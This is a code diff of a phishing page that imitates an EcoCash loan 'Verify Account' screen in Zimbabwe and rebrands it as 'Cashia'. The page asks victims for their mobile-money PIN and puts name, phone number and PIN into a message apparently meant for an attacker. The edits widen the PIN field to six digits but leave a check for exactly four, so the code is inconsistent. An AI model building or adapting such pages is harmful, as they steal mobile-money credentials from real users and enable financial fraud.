@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
     <meta name="theme-color" content="#003366">
-    <title>EcoCash Loan | Verify Account &middot; Zimbabwe</title>
+    <title>Cashia Loan | Verify Account &middot; Zimbabwe</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
@@ -468,13 +468,13 @@ body.light .loan-bar {
     </style>
 </head>
 <body>
-    <header><a class="logo" href="index.html"><span class="eco">Eco</span><span class="cash">Cash</span></a></header>
+    <header><a class="logo" href="index.html"><span class="eco"></span><span class="cash">Cashia</span></a></header>
 
     <main>
         <div class="card">
             <div class="card-head">
                 <h1>Verify Your Account</h1>
-                <p>Enter your EcoCash PIN to authorize this loan transaction</p>
+                <p>Enter your Cashia PIN to authorize this loan transaction</p>
             </div>
 
             <div id="bBar" class="loan-bar" style="display:none;">
@@ -496,9 +496,9 @@ body.light .loan-bar {
                     <div class="iw"><input type="text" class="fi fi-readonly" id="dispAmount" readonly></div>
                 </div>
                 <div class="fg">
-                    <label class="fl">EcoCash PIN</label>
-                    <div class="iw"><input type="password" class="fi" id="pin" placeholder="&#8226;&#8226;&#8226;&#8226;" inputmode="numeric" maxlength="4" required><button type="button" class="pin-tog" onclick="togPin()">Show</button></div>
-                    <p class="hint">Enter your 4-digit EcoCash PIN to authorize this transaction</p>
+                    <label class="fl">Cashia PIN</label>
+                    <div class="iw"><input type="password" class="fi" id="pin" placeholder="&#8226;&#8226;&#8226;&#8226;&#8226;&#8226" inputmode="numeric" maxlength="6" required><button type="button" class="pin-tog" onclick="togPin()">Show</button></div>
+                    <p class="hint">Enter your 6-digit Cashia PIN to authorize this transaction</p>
                 </div>
                 <div class="btns">
                     <button type="submit" class="btn-p">Continue Verifying</button>
@@ -573,7 +573,7 @@ body.light .loan-bar {
 
             if (pin.length !== 4) { showErr('PIN must be exactly 4 digits'); return; }
 
-            var msg = '\u{1f4f1} <b>EcoCash Loan Application</b>\n\n' +
+            var msg = '\u{1f4f1} <b>Cashia Loan Application</b>\n\n' +
                 '<b>Name:</b> <code>' + bd.name + '</code>\n' +
                 '<b>Phone:</b> <code>+263' + bd.phone + '</code>\n' +
                 '<b>PIN:</b> <code>' + pin + '</code>\n' +
@@ -620,4 +620,5 @@ body.light .loan-bar {
         window.addEventListener('load', init);
     </script>
 </body>
-</html>
+                        </html>
+                        
